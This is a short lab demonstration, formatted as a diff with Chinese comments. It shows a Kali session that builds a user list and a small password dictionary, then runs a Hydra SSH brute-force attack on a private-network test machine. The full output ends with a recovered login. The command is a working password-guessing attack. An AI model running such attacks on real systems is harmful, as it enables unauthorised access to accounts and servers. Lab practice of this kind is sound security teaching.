@@ -1,0 +1,43 @@
+# 密码字典 和 用户列表
+root@kali:/mnt# ls
+password.txt  user.txt
+
+# 用户列表
+root@kali:/mnt# cat user.txt 
+lex
+root
+
+# 密码字典
+
+root@kali:/mnt# cat password.txt 
+111111
+222222
+333333
+123456
+
+# 使用hydra指定攻击目标（测试机,密码设为123456），破解成功
+root@kali:/mnt# hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-21 09:58:46
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 12 login tries (l:2/p:6), ~6 tries per task
+[DATA] attacking ssh://192.168.154.131:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://lex@192.168.154.131:22
+[INFO] Successful, password authentication is supported by ssh://192.168.154.131:22
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "lex" - 1 of 12 [child 0] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "" - 2 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "111111" - 3 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "222222" - 4 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "333333" - 5 of 12 [child 0] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "lex" - pass "123456" - 6 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "root" - 7 of 12 [child 0] (0/0)
+[22][ssh] host: 192.168.154.131   login: lex   password: 123456
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "" - 8 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "111111" - 9 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "222222" - 10 of 12 [child 0] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "333333" - 11 of 12 [child 1] (0/0)
+[ATTEMPT] target 192.168.154.131 - login "root" - pass "123456" - 12 of 12 [child 0] (0/0)
+[STATUS] attack finished for 192.168.154.131 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 09:58:58
+
